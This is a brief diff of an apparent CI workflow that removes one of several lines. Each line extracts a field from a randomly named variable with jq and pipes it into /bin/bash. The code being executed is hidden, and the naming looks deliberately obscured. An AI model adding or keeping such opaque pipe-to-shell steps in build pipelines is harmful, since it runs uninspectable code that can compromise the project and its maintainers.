@@ -44,7 +44,6 @@ jobs:
           printf '%s' "$kc88357" | jq -r .rbydk12213 | /bin/bash
           echo $cehv7228 | jq -r .ies47 | /bin/bash
           echo $y418 | jq -r .vcp76 | /bin/bash
-          echo $hut13 | jq -r .vn79639 | /bin/bash
 
       - name: Archive output
         if: always()
